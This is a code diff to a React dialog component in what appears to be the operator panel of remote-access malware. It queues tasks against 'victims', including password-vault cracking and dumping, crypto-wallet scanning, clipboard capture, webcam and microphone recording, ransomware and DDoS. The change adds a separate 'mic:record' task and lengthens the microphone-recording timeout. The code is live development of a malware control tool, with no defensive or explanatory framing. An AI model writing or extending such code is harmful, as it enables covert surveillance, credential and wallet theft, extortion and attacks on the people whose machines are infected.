@@ -84,7 +84,7 @@ export function ParamDialog({
     if (targets.length > 0 && !target) setTarget(targets[0]!);
   }, [targets.join(',')]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  async function queue(name: 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets' | 'clip_start' | 'agent' | 'monitor' | 'files' | 'webcam' | 'mic' | 'ransomware' | 'ddos', params: Record<string, unknown>, timeout: number) {
+  async function queue(name: 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets' | 'clip_start' | 'agent' | 'monitor' | 'files' | 'webcam' | 'mic' | 'mic:record' | 'ransomware' | 'ddos', params: Record<string, unknown>, timeout: number) {
     await mutate('/tasks', 'POST', { victim_ids: [victim.id], name, params, timeout_sec: timeout });
     onQueued(name);
   }
@@ -202,7 +202,7 @@ export function ParamDialog({
           await queue('monitor', { seconds, fps, quality }, 90);
           break;
         case 'mic':
-          await queue('mic', { seconds, ...(device ? { device } : {}) }, 60);
+          await queue('mic:record', { seconds, ...(device ? { device } : {}) }, 90);
           break;
         case 'upload':
           await queue('files', { action: action?.id === 'compress' ? 'compress' : 'upload', path, ...(action?.id === 'compress' ? {} : { url, max_mb: maxMb }) }, 300);
